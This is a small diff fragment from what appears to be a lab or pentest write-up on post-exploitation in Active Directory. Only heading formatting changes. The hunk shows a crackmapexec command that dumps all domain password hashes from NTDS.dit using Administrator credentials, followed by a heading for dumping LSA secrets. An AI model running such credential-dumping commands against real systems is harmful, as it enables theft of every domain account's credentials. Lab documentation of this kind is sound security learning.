@@ -6,7 +6,7 @@ After gaining Domain Admin access, extract all domain user password hashes from 
 
 ## Commands Used
 
-### 1. Dump NTDS.dit (All Domain Hashes)
+ 1. Dump NTDS.dit (All Domain Hashes)
 ```bash
 crackmapexec smb 192.168.56.10 -u 'Administrator' -p 'password@123' --ntds
 2. Dump LSA Secrets
